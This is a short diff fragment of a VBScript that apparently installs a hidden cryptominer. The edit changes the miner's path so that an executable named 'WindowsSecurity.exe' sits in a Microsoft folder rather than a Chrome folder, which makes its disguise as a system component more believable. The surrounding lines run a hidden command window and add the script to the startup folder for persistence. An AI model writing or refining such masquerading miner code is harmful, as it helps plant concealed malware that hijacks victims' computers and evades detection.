@@ -12,7 +12,7 @@ Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
 objShell.Run "cmd /c exit", 0, False
 
 ' Path to WindowsSecurity.exe
-minerPath = "C:\Program Files\Chrome\WindowsSecurity.exe"
+minerPath = "C:\Program Files\Microsoft\WindowsSecurity.exe"
 
 ' Add script to startup folder for persistence
 InstallStartup
